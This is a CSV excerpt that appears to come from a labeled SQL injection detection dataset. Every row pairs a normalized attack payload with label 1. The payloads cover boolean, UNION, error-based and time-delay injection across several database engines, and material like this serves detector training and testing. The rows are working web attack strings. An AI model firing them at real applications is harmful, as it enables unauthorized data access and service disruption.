row_index,payload_norm,label,sqli_type_hint
3180,"1'+ ( select bldn where 8321 = 8321 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
3181,1' where 4388 = 4388,1,
3182,"-7469 ) where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --",1,
3183,-6755 ) or 9323 = 9323#,1,
3184,"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
3185,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'brlc' = 'brlc",1,
3186,"1'+ ( select yfuu where 1717 = 1717 union all select null,null,null,null,null,null,null,null,null--",1,
3187,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'yabn' = 'yabn",1,
3188,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'opll' like 'opll",1,
3189,"1"" ) as qjyu where 2679 = 2679 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3190,"1"" ) where 2657 = 2657 and 5309 = 7592--",1,
3191,"1%' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( '%' = '",1,
3192,1 ) and 3659 = 5475 and ( 8949 = 8949,1,
3193,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""vukd"" = ""vukd",1,
3194,1'+ ( select aqhj where 4419 = 4419,1,
3195,"-1868"" ) where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
3196,"1 ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
3197,"-7806"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""vlrj"" like ""vlrj",1,
3198,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""zcfa"" = ""zcfa",1,
3199,select sleep ( 5 ) -- waln,1,
3200,"-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""gkvy"" = ""gkvy",1,
3201,"1%"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,1,
3202,"-2048 ) ) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",1,
3203,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'jjmt' = 'jjmt",1,
3204,"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#",1,
3205,"-8432 ) union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",1,
3206,"-4889"" ) ) as vvuo where 8060 = 8060 or ( 8459 = 8459 ) *4906--",1,
3207,"1"" ) where 3826 = 3826",1,
3208,-3211 ) ) as fsej where 6348 = 6348 or 9805 = 3783--,1,
3209,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lvck' = 'lvck",1,
